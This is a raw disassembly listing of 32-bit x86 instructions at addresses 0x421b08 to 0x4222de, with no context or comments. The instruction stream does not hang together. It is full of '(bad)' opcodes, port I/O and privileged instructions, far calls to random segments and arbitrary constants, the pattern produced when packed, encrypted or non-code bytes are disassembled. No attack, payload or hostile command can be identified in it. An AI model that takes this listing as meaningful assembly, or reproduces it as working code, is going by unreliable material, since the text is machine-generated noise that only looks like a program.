  421b08:	lock cs xor BYTE PTR fs:[eax+0x19699225],cl
  421b11:	sub    DWORD PTR [eax-0x330672e1],edi
  421b17:	jo     0x421b74
  421b19:	and    eax,0xe206c409
  421b1e:	std    
  421b1f:	mov    ebx,0x20d16dc5
  421b24:	(bad)  
  421b25:	pop    ecx
  421b26:	mov    edi,0x823b503c
  421b2b:	push   ecx
  421b2c:	xchg   esp,eax
  421b2d:	mov    al,ds:0x7bf2c8
  421b32:	inc    esi
  421b33:	fcom   DWORD PTR [ebx+0x5a]
  421b36:	mov    bh,0x73
  421b38:	scas   eax,DWORD PTR es:[edi]
  421b39:	shl    BYTE PTR [edi+0x7872cda7],0xd9
  421b40:	xor    DWORD PTR [ebx],esi
  421b42:	scas   al,BYTE PTR es:[edi]
  421b43:	hlt    
  421b44:	adc    ecx,0xffffff88
  421b47:	jo     0x421b4f
  421b49:	push   edi
  421b4a:	retf   0xdb1c
  421b4d:	nop
  421b4e:	lea    ecx,[ebx-0x52d008fd]
  421b54:	jg     0x421b7a
  421b56:	xor    eax,0x5913cd2f
  421b5b:	mov    esp,0xc73470c
  421b60:	sbb    eax,0x293e4eb
  421b65:	sub    DWORD PTR [ecx],0x951daecf
  421b6b:	std    
  421b6c:	mov    bh,0x62
  421b6e:	mov    bl,0x80
  421b70:	in     eax,dx
  421b71:	jbe    0x421bdb
  421b73:	mov    ds:0x4b190a8e,eax
  421b78:	dec    edx
  421b79:	sub    al,0x72
  421b7b:	fisubr DWORD PTR [ebp-0x44]
  421b7e:	jmp    0xd028:0x2c52b06
  421b85:	push   es
  421b86:	lahf   
  421b87:	fdiv   QWORD PTR ds:0x6ac2aa8a
  421b8d:	jl     0x421c07
  421b8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b90:	xor    al,0x88
  421b92:	ret    
  421b93:	pop    esi
  421b94:	(bad)  
  421b95:	push   ds
  421b96:	jmp    0x421b5b
  421b98:	xor    dl,BYTE PTR [eax+0x6e]
  421b9b:	jmp    0x421bda
  421b9d:	ds aas 
  421b9f:	imul   edx,DWORD PTR [edi+0x33],0x75d74d54
  421ba6:	jl     0x421b3c
  421ba8:	retf   0x1bc1
  421bab:	icebp  
  421bac:	je     0x421c0f
  421bae:	jnp    0x421b41
  421bb0:	mov    ah,0xb1
  421bb2:	ror    DWORD PTR [ebx+0x66],0x84
  421bb6:	dec    ecx
  421bb7:	inc    esp
  421bb8:	faddp  st(2),st
  421bba:	jp     0x421c36
  421bbc:	data16 cmp BYTE PTR [esi],ch
  421bbf:	inc    ebx
  421bc0:	test   DWORD PTR [esp+ebx*8-0x5b],eax
  421bc4:	call   0x501b:0xe489536c
  421bcb:	mov    ecx,DWORD PTR [ecx+0x17]
  421bce:	and    eax,0xc327dc44
  421bd3:	or     al,al
  421bd5:	mov    ecx,0xf5034bb4
  421bda:	inc    esi
  421bdb:	mov    ah,bh
  421bdd:	xchg   edi,eax
  421bde:	neg    BYTE PTR [edi+0x69]
  421be1:	push   ecx
  421be2:	hlt    
  421be3:	add    al,BYTE PTR [ebp*2+0x58301197]
  421bea:	jbe    0x421c67
  421bec:	je     0x421c0e
  421bee:	adc    eax,0x9b3f4a
  421bf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bf4:	mov    ebx,DWORD PTR [edi+0x57]
  421bf7:	not    BYTE PTR [edi]
  421bf9:	fiadd  DWORD PTR [edx-0x1fc358b]
  421bff:	arpl   WORD PTR [eax-0x68118e8e],bx
  421c05:	xor    dl,BYTE PTR [eax+0x47472fbb]
  421c0b:	add    DWORD PTR [eax+0x6],0x3e
  421c0f:	dec    ebp
  421c10:	scas   eax,DWORD PTR es:[edi]
  421c11:	test   BYTE PTR [esi-0x3ddc7e0d],0x76
  421c18:	jle    0x421beb
  421c1a:	stc    
  421c1b:	mov    edi,0x13e304de
  421c20:	mov    ebp,0xee51e358
  421c25:	shl    DWORD PTR [edi],cl
  421c27:	js     0x421c1f
  421c29:	mov    eax,esp
  421c2b:	lea    ebx,[edi]
  421c2d:	dec    ebp
  421c2e:	rcr    DWORD PTR [ecx-0x366a01a9],cl
  421c34:	push   0xf
  421c36:	cmc    
  421c37:	retf   
  421c38:	xchg   edi,eax
  421c39:	dec    ecx
  421c3a:	das    
  421c3b:	pop    ecx
  421c3c:	dec    eax
  421c3d:	cmp    DWORD PTR [esi],ebp
  421c3f:	cmc    
  421c40:	xlat   BYTE PTR ds:[ebx]
  421c41:	int3   
  421c42:	ss mov ebp,edi
  421c45:	push   ds
  421c46:	icebp  
  421c47:	fxch   st(7)
  421c49:	lea    eax,[eax]
	...
  421c57:	icebp  
  421c58:	mov    ebx,DWORD PTR [edi+edi*2-0x700c8002]
  421c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c60:	mov    ebx,0x3146624c
  421c65:	in     eax,dx
  421c66:	call   0x22b:0x1bee6
  421c6d:	add    BYTE PTR [eax],al
  421c6f:	dec    ebp
  421c70:	test   eax,0xdb0fd1b7
  421c75:	stc    
  421c76:	shr    BYTE PTR [ebp-0x44],0x79
  421c7a:	sbb    ecx,DWORD PTR [ebx-0x7d]
  421c7d:	fisttp QWORD PTR [esi]
  421c7f:	pop    es
  421c80:	add    eax,0xcc9b69c3
  421c85:	fwait
  421c86:	pop    edi
  421c87:	inc    ebp
  421c88:	jno    0x421d01
  421c8a:	mov    bh,0x5f
  421c8c:	pop    ebx
  421c8d:	mov    BYTE PTR [ecx-0x6e],ch
  421c90:	mov    ebp,0x5564c3be
  421c95:	pop    edi
  421c96:	pop    ebx
  421c97:	mov    bl,0x71
  421c99:	js     0x421ccf
  421c9b:	or     DWORD PTR [esi],edx
  421c9d:	les    ecx,FWORD PTR [esi+eax*8-0x3e]
  421ca1:	stos   BYTE PTR es:[di],al
  421ca3:	(bad)  
  421ca4:	and    DWORD PTR [eax-0x62],eax
  421ca7:	push   cs
  421ca8:	dec    esp
  421ca9:	and    BYTE PTR [esp+ecx*2-0x7346989a],cl
  421cb0:	aam    0x5d
  421cb2:	pop    ebx
  421cb3:	xchg   esi,eax
  421cb4:	sar    ecx,1
  421cb6:	xlat   BYTE PTR ds:[ebx]
  421cb7:	push   esp
  421cb8:	xchg   ebp,eax
  421cb9:	retf   
  421cba:	sbb    dh,BYTE PTR [edi]
  421cbc:	icebp  
  421cbd:	xor    edx,ebp
  421cbf:	gs (bad) 
  421cc1:	push   0x7e3f1247
  421cc6:	pop    ds
  421cc7:	arpl   WORD PTR [esi+esi*8],cx
  421cca:	cmp    al,0x1f
  421ccc:	cdq    
  421ccd:	xchg   esp,eax
  421cce:	int3   
  421ccf:	adc    al,0x3d
  421cd1:	push   edx
  421cd2:	rcr    BYTE PTR [ebp-0x245d7ade],cl
  421cd8:	add    al,0x4
  421cda:	loopne 0x421ced
  421cdc:	inc    edx
  421cdd:	aad    0xb5
  421cdf:	jp     0x421c6f
  421ce1:	jno    0x421cb0
  421ce3:	or     BYTE PTR [esi+0x7a0d1582],bl
  421ce9:	std    
  421cea:	in     eax,dx
  421ceb:	jecxz  0x421cd3
  421ced:	int3   
  421cee:	in     al,dx
  421cef:	xchg   DWORD PTR [ebx],esi
  421cf1:	stc    
  421cf2:	cdq    
  421cf3:	retf   0x305e
  421cf6:	cmc    
  421cf7:	add    eax,0x466ed37b
  421cfc:	pop    ebx
  421cfd:	std    
  421cfe:	lock das 
  421d00:	fldenv [edx-0x5bfeecd6]
  421d06:	cmc    
  421d07:	ror    DWORD PTR [esi+0x21],cl
  421d0a:	(bad)  
  421d0b:	out    0x70,eax
  421d0d:	xor    eax,0x1373686b
  421d12:	cmc    
  421d13:	lahf   
  421d14:	jno    0x421caf
  421d16:	(bad)  
  421d17:	dec    esi
  421d18:	xchg   edx,eax
  421d19:	pop    ebx
  421d1a:	pop    edx
  421d1b:	or     edi,DWORD PTR [eax-0x66875a3f]
  421d21:	repz call 0xc3f129a2
  421d27:	xchg   edx,eax
  421d28:	pop    ecx
  421d29:	ror    BYTE PTR [ecx-0x26],0xd4
  421d2d:	jl     0x421d55
  421d2f:	xchg   BYTE PTR ds:0x81df6fb6,bl
  421d35:	push   edi
  421d36:	push   es
  421d37:	jmp    0x421d91
  421d39:	xor    bh,BYTE PTR [ebx]
  421d3b:	mov    ah,0x6
  421d3d:	lea    esi,[eax-0xe3d321f]
  421d43:	aaa    
  421d44:	aaa    
  421d45:	add    bl,ah
  421d47:	jo     0x421d32
  421d49:	sar    DWORD PTR [esp+ecx*1-0x2d],cl
  421d4d:	mov    ?,ebx
  421d4f:	ja     0x421cec
  421d51:	iret   
  421d52:	adc    bh,BYTE PTR [eax]
  421d54:	loopne 0x421cde
  421d56:	cmp    eax,0x17372fb2
  421d5b:	push   esi
  421d5c:	and    BYTE PTR [edx],dl
  421d5e:	jecxz  0x421dba
  421d60:	das    
  421d61:	shl    DWORD PTR [ebx],1
  421d63:	push   ebx
  421d64:	mov    ah,0x78
  421d66:	mov    esp,0xaf730e7f
  421d6b:	mov    eax,0x5a692623
  421d70:	ret    0xa2d5
  421d73:	push   ebx
  421d74:	loope  0x421d6c
  421d76:	aad    0x99
  421d78:	aaa    
  421d79:	pusha  
  421d7a:	pop    es
  421d7b:	int    0x2b
  421d7d:	shl    ebx,1
  421d7f:	mov    ebx,0x13ee73aa
  421d84:	jg     0x421d34
  421d86:	aas    
  421d87:	inc    esp
  421d88:	or     BYTE PTR [ecx],0xa1
  421d8b:	mov    edx,0xbfcfa880
  421d90:	push   edi
  421d91:	add    DWORD PTR [ebx-0x5cba694d],0xfbd1da6a
  421d9b:	push   edi
  421d9c:	(bad)  
  421d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d9e:	mov    esi,0xdb24e334
  421da3:	shr    BYTE PTR [eax],0xce
  421da6:	es mov esp,0x9441cfaa
  421dac:	scas   eax,DWORD PTR es:[edi]
  421dad:	sub    bh,BYTE PTR [ecx+0x94daa81]
  421db3:	pop    eax
  421db4:	pop    ebx
  421db5:	(bad)  
  421db6:	call   0x3ed9d7e2
  421dbb:	cli    
  421dbc:	int3   
  421dbd:	repnz push 0x9159cecd
  421dc3:	jnp    0x421d88
  421dc5:	shl    BYTE PTR [esi+0x12],0x7f
  421dc9:	cmovno edi,DWORD PTR [edx]
  421dcc:	xchg   ebx,eax
  421dcd:	mov    ebx,0xbeadf91b
  421dd2:	cmp    eax,0xf9b40918
  421dd7:	loope  0x421e21
  421dd9:	and    al,0x70
  421ddb:	fiadd  WORD PTR [edi+0x19]
  421dde:	aaa    
  421ddf:	jno    0x421da7
  421de1:	push   esp
  421de2:	dec    ebp
  421de3:	sbb    eax,0x35837b38
  421de8:	push   0x3a
  421dea:	push   cs
  421deb:	and    BYTE PTR [ecx],ah
  421ded:	adc    ebp,DWORD PTR [ecx-0x56]
  421df0:	sub    al,0xe9
  421df2:	xchg   edx,eax
  421df3:	add    esi,eax
  421df5:	and    BYTE PTR [ecx-0x12],dh
  421df8:	test   BYTE PTR [edx+0x23394cce],dh
  421dfe:	ror    al,0xf9
  421e01:	or     al,0x44
  421e03:	inc    esp
  421e04:	les    edx,FWORD PTR [edi-0x36]
  421e07:	pop    es
  421e08:	pop    ss
  421e09:	hlt    
  421e0a:	(bad)  
  421e0b:	mov    ebx,0x33e307f0
  421e10:	xchg   esi,eax
  421e11:	xchg   DWORD PTR [ebx+0x43],esi
  421e14:	stc    
  421e15:	inc    edi
  421e16:	push   0x64a8033c
  421e1b:	push   esp
  421e1c:	sar    ebx,cl
  421e1e:	dec    edi
  421e1f:	xlat   BYTE PTR ds:[ebx]
  421e20:	es cmp edx,0xffffff96
  421e24:	push   ebp
  421e25:	sub    edi,DWORD PTR ss:[edx]
  421e28:	retf   0x3481
  421e2b:	ret    0xb5f6
  421e2e:	mov    WORD PTR [ecx],ss
  421e30:	push   cs
  421e31:	clc    
  421e32:	(bad)  
  421e33:	lods   al,BYTE PTR ds:[esi]
  421e34:	add    al,0x2b
  421e36:	and    edi,esi
  421e38:	push   ss
  421e39:	out    dx,eax
  421e3a:	nop
  421e3b:	not    dl
  421e3d:	xchg   esp,eax
  421e3e:	test   al,0x22
  421e40:	out    dx,al
  421e41:	mov    ds:0x83a524ff,eax
  421e46:	pop    ebp
  421e47:	inc    edx
  421e48:	call   0x99b5f4c7
  421e4d:	xchg   esp,eax
  421e4e:	ret    0xe967
  421e51:	stos   DWORD PTR es:[edi],eax
  421e52:	mov    esi,0x6c4314ff
  421e57:	inc    edx
  421e58:	sbb    esp,DWORD PTR [ecx+ebx*1-0x78]
  421e5c:	jb     0x421e88
  421e5e:	dec    edx
  421e5f:	aas    
  421e60:	out    dx,eax
  421e61:	cmc    
  421e62:	sbb    al,0xca
  421e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e65:	or     ebx,DWORD PTR [eax+0x6d925cb4]
  421e6b:	push   ss
  421e6c:	xor    eax,esp
  421e6e:	das    
  421e6f:	mov    al,ds:0x675d5b23
  421e74:	sbb    DWORD PTR [edx],ecx
  421e76:	jb     0x421ece
  421e78:	in     eax,0xc5
  421e7a:	sti    
  421e7b:	inc    eax
  421e7c:	xor    al,0x90
  421e7e:	les    edi,FWORD PTR [edi]
  421e80:	and    BYTE PTR [edi-0x796eee65],0xe9
  421e87:	or     ebx,DWORD PTR [edx+0x50d3f068]
  421e8d:	push   edi
  421e8e:	inc    edx
  421e8f:	adc    al,0x28
  421e91:	shld   eax,ebx,cl
  421e94:	daa    
  421e95:	jbe    0x421e57
  421e97:	cmp    al,BYTE PTR [esi+0xc3]
	...
  421ea5:	add    BYTE PTR [eax],al
  421ea7:	push   esi
  421ea8:	add    BYTE PTR [esi+ebx*1],0xd6
  421eac:	sahf   
  421ead:	pop    esi
  421eae:	enter  0x5c38,0x98
  421eb2:	mov    dl,0xe3
  421eb4:	fisubr WORD PTR [edx]
  421eb6:	loop   0x421ec9
  421eb8:	rol    DWORD PTR [ecx],0x0
  421ebb:	sub    eax,DWORD PTR [edx]
  421ebd:	add    BYTE PTR [eax],al
  421ebf:	mov    edx,0xa13a9098
  421ec4:	bnd ja 0x421e95
  421ec7:	cmpps  xmm1,XMMWORD PTR [edx-0x2f],0x3b
  421ecc:	xlat   BYTE PTR ds:[ebx]
  421ecd:	jg     0x421eeb
  421ecf:	shl    DWORD PTR [edx],0x19
  421ed2:	mov    al,0xe6
  421ed4:	rcl    BYTE PTR [edx+0x58],cl
  421ed7:	sub    eax,0xbaad5874
  421edc:	xchg   edi,eax
  421edd:	cmp    al,0xb6
  421edf:	jl     0x421e9a
  421ee1:	mov    edx,0xe75100e0
  421ee6:	fsubr  DWORD PTR [eax+edi*1]
  421ee9:	push   ecx
  421eea:	mov    WORD PTR [eax],es
  421eec:	rol    ecx,cl
  421eee:	add    eax,0x53468615
  421ef3:	rol    DWORD PTR [ebx+eiz*2-0x2e5fc845],cl
  421efa:	retf   0x39d1
  421efd:	lahf   
  421efe:	and    ebp,esp
  421f00:	jp     0x421ea4
  421f02:	inc    ecx
  421f03:	popf   
  421f04:	xor    bl,BYTE PTR [esp+ebx*2-0x71]
  421f08:	mov    ch,0x7c
  421f0a:	into   
  421f0b:	sbb    BYTE PTR [ebx+0x4a],ah
  421f0e:	xchg   esi,eax
  421f0f:	add    bl,BYTE PTR [eax+0x358b7ac]
  421f15:	mov    bh,BYTE PTR [ebp-0x7ddccf33]
  421f1b:	clc    
  421f1c:	and    DWORD PTR [ebx+0x25],0x6da9f742
  421f23:	lahf   
  421f24:	mov    eax,0xe01ad2a8
  421f29:	mov    bh,0x8b
  421f2b:	ja     0x421f63
  421f2d:	or     eax,0x5f12da1d
  421f32:	xchg   DWORD PTR [eax-0x546192d5],eax
  421f38:	(bad)  
  421f39:	sub    edx,DWORD PTR [ecx-0x9]
  421f3c:	(bad)  
  421f3e:	aam    0x16
  421f40:	addr16 mov ds:0x5ca9,eax
  421f44:	push   edi
  421f45:	rcl    BYTE PTR [ecx+0x25],cl
  421f48:	sbb    DWORD PTR [edi],0x2fb16665
  421f4e:	pop    eax
  421f4f:	in     eax,dx
  421f50:	std    
  421f51:	jle    0x421f73
  421f53:	scas   eax,DWORD PTR es:[edi]
  421f54:	stos   BYTE PTR es:[edi],al
  421f55:	retf   
  421f56:	jmp    0x35aba3c5
  421f5b:	mov    ecx,0xcb28d0aa
  421f60:	aaa    
  421f61:	lods   eax,DWORD PTR ds:[esi]
  421f62:	into   
  421f63:	jns    0x421fb5
  421f65:	push   ebx
  421f66:	xor    ch,BYTE PTR [esi-0x58]
  421f69:	fld    st(6)
  421f6b:	in     al,0x54
  421f6d:	inc    esi
  421f6e:	imul   edi,eax,0x26e5b0c6
  421f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f75:	cld    
  421f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f77:	aaa    
  421f78:	xlat   BYTE PTR ds:[ebx]
  421f79:	repz sub eax,0x78e9e1e
  421f7f:	jmp    0x421f4c
  421f81:	mov    al,0xe7
  421f83:	sar    BYTE PTR [ecx],cl
  421f85:	pop    eax
  421f86:	out    0x64,al
  421f88:	mov    ah,BYTE PTR [ecx+ebp*8-0x6e280981]
  421f8f:	(bad)  
  421f90:	sahf   
  421f91:	ret    
  421f92:	adc    BYTE PTR [eax+0x4827bd75],dl
  421f98:	and    ch,BYTE PTR [edx+0x58b13cdf]
  421f9e:	les    esi,FWORD PTR [edx+0x34]
  421fa1:	aaa    
  421fa2:	fisubr WORD PTR [ecx-0x2b8d43df]
  421fa8:	mov    DWORD PTR [edi+0x37483918],edx
  421fae:	xchg   ebx,eax
  421faf:	fidivr DWORD PTR [edx+edx*2+0x70]
  421fb3:	(bad)
  421fb7:	call   DWORD PTR [eax-0x222f5950]
  421fbd:	jbe    0x421f68
  421fbf:	shl    DWORD PTR [eax-0x7758b928],cl
  421fc5:	dec    ebp
  421fc6:	jbe    0x421fea
  421fc8:	or     dh,cl
  421fca:	outs   dx,DWORD PTR ds:[esi]
  421fcb:	cld    
  421fcc:	ins    DWORD PTR es:[edi],dx
  421fcd:	fwait
  421fce:	fwait
  421fcf:	inc    ecx
  421fd0:	btr    DWORD PTR [edx-0x33],esp
  421fd4:	cli    
  421fd5:	fcomp  DWORD PTR [edx]
  421fd7:	iret   
  421fd8:	jae    0x421f9d
  421fda:	mov    edx,0x241844d5
  421fdf:	or     BYTE PTR [ebx+0x157f78bc],bh
  421fe5:	cld    
  421fe6:	mov    ebx,0x89414038
  421feb:	daa    
  421fec:	jnp    0x422053
  421fee:	das    
  421fef:	xchg   ebp,eax
  421ff0:	loopne 0x421fff
  421ff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ff3:	jae    0x421fa9
  421ff5:	jo     0x421f91
  421ff7:	pusha  
  421ff8:	mov    al,0x57
  421ffa:	cmp    DWORD PTR [esi-0x1d],esi
  421ffd:	stos   DWORD PTR es:[edi],eax
  421ffe:	(bad)  
  421fff:	test   al,0xcb
  422001:	int    0x6
  422003:	aaa    
  422004:	les    edx,FWORD PTR [ebp-0x5099e363]
  42200a:	push   cs
  42200b:	into   
  42200c:	loop   0x421f8f
  42200e:	pop    ds
  42200f:	fistp  DWORD PTR [eax-0x5c835cf9]
  422015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422016:	add    dl,ch
  422018:	xchg   edi,eax
  422019:	dec    edx
  42201a:	mov    ebp,0x33766cfc
  42201f:	push   ebp
  422020:	std    
  422021:	adc    BYTE PTR [edi],dl
  422023:	adc    al,0xf5
  422025:	pop    ds
  422026:	int3   
  422027:	ja     0x421ff1
  422029:	or     BYTE PTR ds:0x9aefcaf7,ah
  42202f:	add    al,0xae
  422031:	jg     0x421ff7
  422033:	xchg   esp,eax
  422034:	mov    esp,DWORD PTR ds:0x223e3ea2
  42203a:	fadd   QWORD PTR [ecx]
  42203c:	lods   al,BYTE PTR ds:[esi]
  42203d:	test   eax,0xc9c6ed64
  422042:	and    dh,dh
  422044:	or     eax,0xaab51417
  422049:	call   0x9e7c:0xdf654161
  422050:	(bad)  
  422052:	sbb    esi,DWORD PTR ds:0xd0f77604
  422058:	cmp    ecx,DWORD PTR [ebx+edi*4]
  42205b:	repz ficom WORD PTR [edi+ebx*1+0x6a]
  422060:	add    al,0xfc
  422062:	scas   al,BYTE PTR es:[edi]
  422063:	cmp    BYTE PTR [edi+0x9],ah
  422066:	je     0x422000
  422068:	inc    eax
  422069:	mov    edx,0x177d05fc
  42206e:	and    DWORD PTR [esp+eax*1],esp
  422071:	jge    0x42203d
  422073:	inc    eax
  422074:	adc    al,cl
  422076:	pop    esp
  422077:	fistp  DWORD PTR [ebp+0x45]
  42207a:	xchg   ebp,eax
  42207b:	mov    DWORD PTR [edi],0xe3676d72
  422081:	fsubr  QWORD PTR [esi]
  422083:	or     edx,DWORD PTR [edi+0x3a]
  422086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422087:	shl    DWORD PTR [ecx+ebp*4-0xfdc70bd],0x8e
  42208f:	out    0x72,eax
  422091:	inc    esp
  422092:	and    al,0x53
  422094:	stos   BYTE PTR es:[edi],al
  422095:	in     al,dx
  422096:	ins    DWORD PTR es:[edi],dx
  422097:	sbb    BYTE PTR [esi-0x5dc321e4],dh
  42209d:	sub    DWORD PTR [ebx+0x71],0x72037983
  4220a4:	xchg   esi,eax
  4220a5:	jecxz  0x422099
  4220a7:	int    0x1c
  4220a9:	mov    ah,0x44
  4220ab:	mov    cl,0x10
  4220ad:	sub    ch,BYTE PTR [ebx+0x7d101a4e]
  4220b3:	push   ebp
  4220b4:	lods   al,BYTE PTR ds:[esi]
  4220b5:	pop    ebx
  4220b6:	rep lods eax,DWORD PTR ds:[esi]
  4220b8:	mov    al,0x76
  4220ba:	jns    0x42204e
  4220bc:	or     esi,esp
  4220be:	mov    edi,0xa47c968d
  4220c3:	xchg   esp,eax
  4220c4:	das    
  4220c5:	call   0x8588416a
  4220ca:	ret    0x207d
  4220cd:	ds mov cl,0xb4
  4220d0:	mov    dl,0xb9
  4220d2:	mov    edx,0xe614b047
  4220d7:	or     bh,BYTE PTR ds:0x640c21c2
  4220dd:	push   ebp
  4220de:	ins    DWORD PTR es:[edi],dx
  4220df:	xchg   ebx,eax
  4220e0:	cmp    esi,ebx
  4220e2:	shl    BYTE PTR [edx-0x3b2d4f07],0x77
  4220e9:	jbe    0x4220eb
	...
  4220f7:	out    dx,eax
  4220f8:	sbb    ecx,DWORD PTR [eax]
  4220fa:	inc    esi
  4220fb:	cld    
  4220fc:	push   edi
  4220fd:	out    dx,eax
  4220fe:	mov    ebx,0xc8331785
  422103:	jnp    0x422163
  422105:	ret    0x3cc0
  422108:	ret    
  422109:	add    DWORD PTR [eax],eax
  42210b:	sub    eax,DWORD PTR [edx]
  42210d:	add    BYTE PTR [eax],al
  42210f:	aad    0xd7
  422111:	fisub  WORD PTR [esi+0x52ae6c44]
  422117:	jo     0x42218c
  422119:	das    
  42211a:	xchg   ecx,eax
  42211b:	fwait
  42211c:	nop
  42211d:	pop    ecx
  42211e:	ja     0x4220c7
  422120:	inc    edx
  422121:	bound  edi,QWORD PTR [edi]
  422123:	xchg   DWORD PTR [eax+0x39d40fe4],ebx
  422129:	sub    esp,ebp
  42212b:	sub    eax,DWORD PTR [eax+ebp*4+0x70343fe4]
  422132:	xchg   ebx,eax
  422133:	lea    esi,[ebx+0x20]
  422136:	call   0x451b:0x1c1cbfef
  42213d:	xchg   BYTE PTR [edx],bl
  42213f:	jecxz  0x422151
  422141:	xlat   BYTE PTR ds:[ebx]
  422142:	inc    esp
  422143:	std    
  422144:	rol    BYTE PTR [edx-0x1c],0x8d
  422148:	push   0xc4ec42e4
  42214d:	pop    ebx
  42214e:	clc    
  42214f:	adc    ch,BYTE PTR [ebp-0x39]
  422152:	imul   ecx,DWORD PTR [ebp+0x65d82fc5],0xf1cce6ee
  42215c:	fst    QWORD PTR [ebp+0x552d61dc]
  422162:	mov    ebx,0xc46fe43e
  422167:	mov    DWORD PTR [edx+ebp*2+0x74d27abd],esp
  42216e:	popa   
  42216f:	mov    ecx,ecx
  422171:	jp     0x4221d4
  422173:	mov    edi,0x71a2f7d1
  422178:	outs   dx,BYTE PTR ds:[esi]
  422179:	ins    DWORD PTR es:[edi],dx
  42217a:	dec    esp
  42217b:	jo     0x42216e
  42217d:	outs   dx,BYTE PTR ds:[esi]
  42217e:	add    ah,BYTE PTR [esi-0x65]
  422181:	jne    0x4221d3
  422183:	or     al,0x0
  422185:	test   DWORD PTR [esi+esi*8],ebp
  422188:	jae    0x422160
  42218a:	ins    BYTE PTR es:[edi],dx
  42218b:	sbb    eax,0x617eb9a0
  422190:	pop    ebp
  422191:	ins    BYTE PTR es:[edi],dx
  422192:	pushf  
  422193:	sub    ecx,ecx
  422195:	scas   al,BYTE PTR es:[edi]
  422196:	ds push esi
  422198:	jecxz  0x4221a8
  42219a:	fnstenv [esi+ecx*8-0x6b]
  42219e:	frstor [ecx+esi*2]
  4221a1:	test   DWORD PTR [edi-0x1191947d],ebx
  4221a7:	pushf  
  4221a8:	push   edi
  4221a9:	and    edi,edx
  4221ab:	pop    esp
  4221ac:	out    0x8b,eax
  4221ae:	aas    
  4221af:	fstp   QWORD PTR [eax+0x327b5d84]
  4221b5:	mov    ah,0x86
  4221b7:	jl     0x42216e
  4221b9:	ret    
  4221ba:	data16 ja 0x4221ef
  4221bd:	inc    ebp
  4221be:	ins    BYTE PTR es:[edi],dx
  4221bf:	(bad)  
  4221c0:	fdivp  st(4),st
  4221c2:	clc    
  4221c3:	pusha  
  4221c4:	xor    eax,0xa580df24
  4221c9:	fwait
  4221ca:	pop    ebx
  4221cb:	stos   BYTE PTR es:[edi],al
  4221cc:	and    bl,BYTE PTR [esi]
  4221ce:	adc    al,0xbf
  4221d0:	cmp    BYTE PTR [ebx+0x65],0x34
  4221d4:	fcom   DWORD PTR [eax+0x2964dae0]
  4221da:	add    eax,0xbce5bbc9
  4221df:	out    dx,eax
  4221e0:	aad    0x4a
  4221e2:	cmp    DWORD PTR [edi],esi
  4221e4:	pushf  
  4221e5:	fmul   st(1),st
  4221e7:	add    BYTE PTR [edi],dh
  4221e9:	mov    esp,0x2c32d181
  4221ee:	popa   
  4221ef:	xchg   edx,eax
  4221f0:	pop    eax
  4221f1:	pop    edx
  4221f2:	(bad)  
  4221f3:	dec    eax
  4221f4:	fs es sahf 
  4221f7:	fdivp  st(6),st
  4221f9:	imul   esi,DWORD PTR [ebp+0x5d730e6f],0x52
  422200:	or     eax,0x8336955e
  422205:	loop   0x422268
  422207:	fild   DWORD PTR [esi]
  422209:	dec    edi
  42220a:	sub    ch,BYTE PTR [ebx+0xb]
  42220d:	sbb    DWORD PTR [ecx],esp
  42220f:	cmp    BYTE PTR [edi+0x4557b3a8],dh
  422215:	scas   al,BYTE PTR es:[edi]
  422216:	mov    eax,ds:0xee446d76
  42221b:	inc    edi
  42221c:	and    edi,DWORD PTR ds:0x41b99ebc
  422222:	pop    ds
  422223:	lods   eax,DWORD PTR ds:[esi]
  422224:	outs   dx,DWORD PTR ds:[esi]
  422225:	inc    esi
  422226:	xor    bl,BYTE PTR ds:0xc47a4fa0
  42222c:	jmp    0x515c27af
  422231:	(bad)  
  422232:	mov    esi,0x7c066969
  422237:	(bad)  
  422238:	pop    ds
  422239:	xor    BYTE PTR [edi],dh
  42223b:	mov    WORD PTR [edx+0x1e],ss
  42223e:	mov    esp,0x326a51d4
  422243:	icebp  
  422244:	xchg   ebp,eax
  422245:	sub    DWORD PTR [ebx+ecx*2],eax
  422248:	or     ch,BYTE PTR [ecx+ebx*2]
  42224b:	mov    dh,0x9b
  42224d:	jl     0x422226
  42224f:	fistp  QWORD PTR [ecx]
  422251:	push   es
  422252:	test   DWORD PTR [eax-0x4b917b67],0xc3a44cc5
  42225c:	xchg   edx,eax
  42225d:	repnz rcr edi,1
  422260:	jp     0x4221e4
  422262:	mov    ah,0xe4
  422264:	and    eax,0xe7b023b1
  422269:	call   0x6d79691a
  42226e:	icebp  
  42226f:	in     al,0x57
  422271:	test   DWORD PTR [eax-0x78a8437d],edx
  422277:	je     0x422274
  422279:	cmp    al,0x5c
  42227b:	mov    ss,ebx
  42227d:	push   0xffffff9d
  42227f:	in     al,0xb9
  422281:	es jp  0x4222d8
  422284:	cmc    
  422285:	or     dl,al
  422287:	sbb    eax,0x57eadc28
  42228c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42228d:	xchg   esp,eax
  42228e:	and    bl,bl
  422290:	mov    edx,0xef0088d5
  422295:	jl     0x422254
  422297:	add    eax,0xa985a4cd
  42229c:	in     al,dx
  42229d:	fild   WORD PTR [edx-0x6a]
  4222a0:	or     eax,0xdc2b228
  4222a5:	int    0xbb
  4222a7:	lds    ecx,FWORD PTR [edx-0x4f]
  4222aa:	dec    ebx
  4222ab:	cld    
  4222ac:	fs xor eax,0xb56ea9e
  4222b2:	adc    ah,BYTE PTR [ebp-0x36]
  4222b5:	or     eax,0x34d7e046
  4222ba:	test   BYTE PTR [edi+0x62f609e2],bl
  4222c0:	add    al,0xb1
  4222c2:	mov    al,BYTE PTR [eax]
  4222c4:	mov    al,0x73
  4222c6:	xchg   ebp,eax
  4222c7:	sub    DWORD PTR [eax-0x27],ecx
  4222ca:	push   es
  4222cb:	fwait
  4222cc:	outs   dx,DWORD PTR ds:[esi]
  4222cd:	out    dx,eax
  4222ce:	add    eax,ecx
  4222d0:	loopne 0x4222e1
  4222d2:	bound  ebp,QWORD PTR [eax-0x58a6ff1a]
  4222d8:	neg    BYTE PTR [eax+0x47aa3376]
  4222de:	cmp    DWORD PTR [esi+0x2f8c8792],eax
